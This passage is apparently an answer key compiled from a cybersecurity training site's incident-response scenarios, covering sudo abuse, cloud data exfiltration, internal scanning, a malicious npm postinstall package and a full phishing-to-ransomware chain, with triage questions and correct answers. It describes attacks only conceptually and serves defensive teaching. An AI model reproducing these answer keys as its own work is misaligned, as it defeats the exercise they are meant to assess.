  - MITRE: `T1548.003`, `T1059.004`

#### Timeline

- **13:17:50** — `sudo -l` or sudoers enumeration
- **13:17:55** — Root shell obtained via GTFOBins technique
- **13:17:58** — Root reconnaissance begins
- **13:18:30** — Malicious cron persistence added

### Case report prompts

- Describe the sudo misconfiguration and how it was exploited.
- Local privilege escalation — deploy_svc had SSH access.
- APPSERVER-02 — full root compromise.
- T1548.003 sudo abuse and persistence via cron.
- What is the immediate sudoers fix and how do you check for post-exploitation artifacts?

### Draft case report answers

**Summary:** The `deploy_svc` account on `APPSERVER-02` abused a misconfigured `sudoers` entry that allowed `find` to run as root without a password. Because `find -exec` can launch arbitrary commands, the attacker used it to spawn a root shell and then established cron-based persistence.

**Access path:** This was a local privilege escalation after the low-privilege account already had shell access.

**Affected assets:** `APPSERVER-02` should be treated as fully compromised at root level.

**MITRE TTPs:** Relevant techniques include `T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching`, `T1059.004 Unix Shell`, and persistence through scheduled task abuse.

**Containment:** Remove the dangerous sudoers entry immediately, review `/etc/sudoers` and included configs, inspect cron jobs and shell histories, and hunt for new keys, binaries, and outbound connections created after escalation.

### Triage questions, answers, and explanations

1. **Why is allowing `find` under sudo dangerous?**
  - **Correct answer:** Because `find -exec` can be abused to spawn arbitrary commands, including a root shell
  - **Explanation:** Many legitimate utilities become privilege-escalation paths when granted unrestricted sudo rights.
2. **What is GTFOBins in this context?**
  - **Correct answer:** A known catalog of legitimate binaries that can be abused for privilege escalation or shell escape
  - **Explanation:** Attackers often consult GTFOBins to turn benign tools into post-exploitation primitives.
3. **Why is the cron entry important after the root shell?**
  - **Correct answer:** It indicates persistence was established after privilege escalation
  - **Explanation:** A recurring cron job lets the attacker regain code execution even if the initial shell is lost.
4. **What should be reviewed immediately after fixing sudoers?**
  - **Correct answer:** Post-exploitation artifacts such as cron jobs, SSH keys, shells, logs, and outbound connections
  - **Explanation:** Fixing the root cause alone is not enough once the attacker already had root access.

---

## Scenario 12 — Cloud Storage: Bulk Data Exfiltration

**Category:** Collection  
**Severity:** High

### Overview

A cloud service account downloaded `22.4 GB` of SharePoint data from a Singapore VPS using a likely stolen OAuth token.

### Extracted subsections

#### Alert findings

1. **ALT-1150 — Service account bulk SharePoint download from VPS**
  - User: `svc-backup@corp.ph`
  - Source IP: `45.77.22.104 (Vultr SG)`
  - Data volume: `22.4 GB`
  - Duration: `2 hours`
  - Data sources: Finance, HR, Legal, and R&D SharePoint libraries
  - Likely root cause: stolen non-expiring OAuth token
  - MITRE: `T1530`, `T1078.004`

#### Timeline

- **Unknown** — OAuth token theft estimated ~90 days prior
- **14:30:01** — Bulk download begins
- **14:30:01–16:30:00** — Continuous exfiltration
- **16:30:00** — Session ends

### Case report prompts

- Document the cloud exfiltration event, the compromised account, and data at risk.
- Service account OAuth token compromise — likely stolen 90 days prior.
- [svc-backup@corp.ph](mailto:svc-backup@corp.ph) · 22.4 GB of SharePoint data exfiltrated.
- T1530 and T1078.004.
- What immediate cloud-specific actions must be taken?

### Draft case report answers

**Summary:** The account `svc-backup@corp.ph` was used to download `22.4 GB` of SharePoint data from a Singapore VPS over a two-hour period, behavior inconsistent with its normal profile. The most likely root cause is compromise of a long-lived OAuth token that provided cloud access without interactive login.

**Access path:** This appears to be token-based cloud account abuse rather than a password-only compromise.

**Affected assets:** The affected account is `svc-backup@corp.ph`, and exposed data includes content from Finance, HR, Legal, and R&D SharePoint repositories.

**MITRE TTPs:** The primary techniques are `T1530 Data from Cloud Storage Object` and `T1078.004 Valid Accounts: Cloud Accounts`.

**Containment:** Revoke the token and related sessions immediately, rotate credentials and app secrets, review app consent and service principal permissions, scope all accessed data, and enable stronger conditional access and token lifetime controls.

### Triage questions, answers, and explanations

1. **Why is the VPS source IP a major red flag?**
  - **Correct answer:** It is inconsistent with the service account’s normal behavior and indicates likely attacker-controlled infrastructure
  - **Explanation:** Service accounts should usually operate from expected services, automation platforms, or trusted networks.
2. **Why are non-expiring OAuth tokens dangerous?**
  - **Correct answer:** They allow long-term access without repeated authentication if stolen
  - **Explanation:** A compromised long-lived token can remain useful for months unless explicitly revoked.
3. **What type of MITRE technique is represented by downloading SharePoint content at scale?**
  - **Correct answer:** `T1530 Data from Cloud Storage Object`
  - **Explanation:** The attacker is collecting and exfiltrating cloud-hosted organizational data.
4. **What should happen first in cloud containment?**
  - **Correct answer:** Revoke the compromised token or sessions and rotate affected credentials/secrets
  - **Explanation:** Until token-based access is invalidated, the attacker may still have ongoing cloud access.

---

## Scenario 13 — Internal Port Scan: Post-Compromise Recon

**Category:** Discovery  
**Severity:** Medium

### Overview

`WS-FIN-03` performed an unauthorized internal scan across `254` hosts in the `10.10.0.0/24` range.

### Extracted subsections

#### Alert findings

1. **ALT-1160 — nmap-pattern port scan from Finance workstation**
  - Host: `WS-FIN-03`
  - User: `SYSTEM`
  - Scope: `254 hosts`, multiple common ports
  - Key findings: `DC01`, `FILESERVER-01`, SMB-signing-disabled hosts
  - MITRE: `T1046`, `T1135`

#### Timeline

- **09:44:50** — Local recon with `arp -a` and `net view`
- **09:45:00** — SYN scan launched against subnet
- **09:51:00** — Results returned to attacker via C2
- **09:52:00** — `DC01` and `FILESERVER-01` selected as next targets

### Case report prompts

- Document the internal scan — source, targets, technique, and what the attacker likely learned.
- Post-compromise activity from already-owned WS-FIN-03.
- Entire 10.10.0.0/24 subnet scanned. DC01 and FILESERVER-01 identified.
- T1046 Network Service Discovery.
- How should the network be segmented to limit what an attacker can discover and reach?

### Draft case report answers

**Summary:** From the compromised workstation `WS-FIN-03`, the attacker conducted broad internal service discovery across the `10.10.0.0/24` subnet using scan behavior consistent with `nmap`. The results identified high-value systems such as `DC01` and `FILESERVER-01`, which likely informed subsequent lateral movement and impact actions.

**Access context:** This was post-compromise recon from an already-owned Finance endpoint.

**Affected assets:** The scan touched the full subnet, with special attacker interest in the Domain Controller, file server, and hosts exposing weak SMB configurations.

**MITRE TTPs:** Relevant techniques include `T1046 Network Service Discovery` and `T1135 Network Share Discovery`.

**Containment:** Segment user workstations away from administrative infrastructure, tightly restrict east-west traffic, and limit which hosts can reach servers like DCs and file servers. Detection should also flag scan behavior originating from non-admin endpoints.

### Triage questions, answers, and explanations

1. **Why is scanning from a Finance workstation suspicious?**
  - **Correct answer:** Because it is not an authorized scanning platform and indicates post-compromise reconnaissance
  - **Explanation:** Workstations in normal business roles should not be sweeping internal networks for open ports.
2. **What does identifying `DC01` and `FILESERVER-01` tell you about attacker intent?**
  - **Correct answer:** The attacker is looking for high-value targets for lateral movement and impact
  - **Explanation:** Identity and file infrastructure are common next-step targets after internal recon.
3. **Which MITRE technique best matches this activity?**
  - **Correct answer:** `T1046 Network Service Discovery`
  - **Explanation:** The attacker is mapping reachable services across internal hosts.
4. **What defensive design would most reduce this risk?**
  - **Correct answer:** Strong internal segmentation and access controls between user endpoints and critical servers
  - **Explanation:** Even if one workstation is compromised, good segmentation limits discovery and lateral reach.

---

## Scenario 14 — Supply Chain: Malicious npm Package

**Category:** Initial Access / Supply Chain  
**Severity:** High

### Overview

A compromised npm package maintainer account introduced malicious install-time behavior that exfiltrated `.env` secrets during CI/CD execution.

### Extracted subsections

#### Alert findings

1. **ALT-1170 — npm package exfiltrates `.env` during install**
  - Host: `DEV-WS-04`
  - User: `dev.santos`
  - Package behavior: malicious `postinstall` script
  - Exfil destination: `144.76.12.88`
  - Secrets exposed: `DB_PASSWORD`, `API_KEY`, `JWT_SECRET`, `AWS_SECRET`
  - MITRE: `T1195.002`, `T1552.001`

#### Timeline

- **Unknown** — Maintainer account compromised
- **15:22:00** — CI/CD runs `npm install`
- **15:22:03** — `.env` values read and POSTed out
- **15:22:05** — Secrets fully exfiltrated

### Case report prompts

- Describe the supply chain attack — what was compromised and what data was exfiltrated.
- Malicious npm package installed via CI/CD pipeline.
- DEV-WS-04 · .env secrets · potentially all CI/CD environments running this package version.
- T1195.002 and T1552.001.
- What must happen to all secrets that may have been in `.env` files on any system that ran this package?

### Draft case report answers

**Summary:** A malicious update to a popular npm package executed during `npm install` and exfiltrated environment variables from `.env` files on `DEV-WS-04` and potentially any CI/CD environment running the affected version. Exposed values included database credentials, API keys, JWT secrets, and AWS secrets.

**Access path:** This was a software supply chain compromise caused by trusting a poisoned dependency delivered through the normal package installation process.

**Affected assets:** The directly observed host is `DEV-WS-04`, but the true scope may include all developer and pipeline systems that installed the compromised package version.

**MITRE TTPs:** The primary techniques are `T1195.002 Compromise Software Supply Chain` and `T1552.001 Credentials in Files`.

**Containment:** Every secret potentially present in `.env` on any affected system must be treated as compromised and rotated. The bad package version should be blocked, dependency trees reviewed, and CI/CD supply chain protections tightened.

### Triage questions, answers, and explanations

1. **Why is a `postinstall` script dangerous in this scenario?**
  - **Correct answer:** Because it executes automatically during package installation and can run malicious code silently
  - **Explanation:** Install hooks are powerful and often trusted, making them attractive for supply chain abuse.
2. **Why are `.env` files a common target?**
  - **Correct answer:** They often contain plaintext secrets such as API keys, database passwords, and tokens
  - **Explanation:** Secrets in files are easy to harvest once code execution is achieved.
3. **Which MITRE technique best describes this compromise?**
  - **Correct answer:** `T1195.002 Compromise Software Supply Chain`
  - **Explanation:** The attacker poisoned a trusted software dependency path.
4. **What is the most important remediation after discovery?**
  - **Correct answer:** Rotate all potentially exposed secrets, not just the ones observed in one environment
  - **Explanation:** Once secrets are exfiltrated, they must be assumed compromised everywhere the package ran.

---

## Scenario 15 — Full Incident: Attack Chain Reconstruction

**Category:** Incident Response / Capstone  
**Severity:** Critical

### Overview

This scenario asks for a full reconstruction of the intrusion from phishing through domain compromise, exfiltration, and ransomware impact.

### Extracted subsections

#### Alert findings

1. **ALT-CAPSTONE — Full attack chain reconstruction**
  - Overall sequence: phishing → PowerShell execution → reverse shell → credential dump → Pass-the-Hash → ransomware → DNS exfiltration
  - Key affected systems: `WS-FIN-03`, `DC01`, `FILESERVER-01`, network shares
  - Root cause themes: weak email trust controls, no MFA on privileged access, NTLM exposure, lack of credential hardening, flat network design
  - Full MITRE chain: `T1566.001 → T1059.001 → T1071.001 → T1003.001 → T1550.002 → T1486 → T1048.003`

#### Timeline

- **09:12:38** — Phishing email delivered
- **09:14:02** — Malicious attachment executed
- **09:14:47** — Encoded PowerShell and AMSI bypass
- **09:15:03** — Reverse shell/C2 established
- **09:17:21** — Mimikatz dumps credentials
- **09:18:55** — DNS exfiltration occurs
- **09:22:11** — Pass-the-Hash to Domain Controller
- **09:31:04** — Ransomware encrypts file server data

### Case report prompts

- Provide a complete executive summary of the full attack chain — from first alert to domain compromise.
- The initial phishing email was the root cause entry point.
- All systems: WS-FIN-03, DC01, FILESERVER-01, all network shares.
- List the complete MITRE ATT&CK chain across all 7 phases.
- Provide prioritized IR recommendations addressing the root causes that allowed this attack to succeed.

### Draft case report answers

**Executive summary:** The incident began with a spoofed phishing email sent to Finance user Ana Reyes, who executed a malicious attachment on `WS-FIN-03`. That payload dropped a second-stage executable, launched obfuscated PowerShell with AMSI bypass, established a SYSTEM-level reverse shell, dumped LSASS to steal `CORP\admin.santos` credentials, exfiltrated data over DNS, moved laterally to `DC01` using Pass-the-Hash and PsExec, and finally deployed ransomware against `FILESERVER-01` and mapped shares.

**Initial access/root cause:** The root cause was phishing-based initial access enabled by insufficient email trust controls and unsafe execution of a disguised attachment. Multiple later controls also failed, including endpoint hardening, credential protection, privileged access controls, and network segmentation.

**Affected assets:** The primary affected systems are `WS-FIN-03`, `DC01`, `FILESERVER-01`, and associated network shares, with broader impact to Active Directory and enterprise data availability.

**MITRE ATT&CK chain:** The attack chain includes `T1566.001`, `T1204.002`, `T1027.002`, `T1105`, `T1059.001`, `T1027`, `T1562.001`, `T1071.001`, `T1572`, `T1003.001`, `T1134`, `T1550.002`, `T1078.002`, `T1021.002`, `T1543.003`, `T1490`, `T1486`, `T1048.003`, and `T1071.004`.

**Prioritized IR recommendations:** Immediately isolate impacted systems, revoke compromised accounts and tokens, and contain domain-level access. After stabilization, enforce MFA for privileged access, restrict or phase out NTLM where possible, harden PowerShell and credential protections, block direct outbound DNS and risky egress, improve email filtering/sandboxing, and segment user endpoints from critical infrastructure.

### Triage questions, answers, and explanations

1. **What was the root cause entry point of the incident?**
  - **Correct answer:** A phishing email with a malicious attachment
  - **Explanation:** The entire attack chain started when the Finance user executed the spoofed invoice attachment.
2. **What key step allowed the attacker to move from one compromised workstation to full domain compromise?**
  - **Correct answer:** Credential dumping followed by Pass-the-Hash to the Domain Controller
  - **Explanation:** Stealing the admin NTLM hash bridged the gap between endpoint compromise and domain takeover.
3. **Why was the incident able to escalate so quickly?**
  - **Correct answer:** Multiple controls failed across email security, endpoint hardening, identity protection, and network segmentation
  - **Explanation:** The attacker did not rely on one single gap; they chained several weak points in sequence.
4. **What is the highest-priority long-term lesson from the incident?**
  - **Correct answer:** Defense-in-depth across email, identity, endpoint, and network controls is necessary to prevent a small foothold from becoming enterprise-wide compromise
  - **Explanation:** The scenario shows how one successful phish can cascade when later-stage controls are weak or absent.

---

## Notes

- The site contains **15 total scenarios**.
- Each scenario includes **4 triage questions**.
- Some of the questions are explicitly visible in the site data, while the final answer phrasing here is normalized into cleaner markdown for reporting.
- The draft case report answers were written to stay within the requested **1–3 sentence** range per prompt.

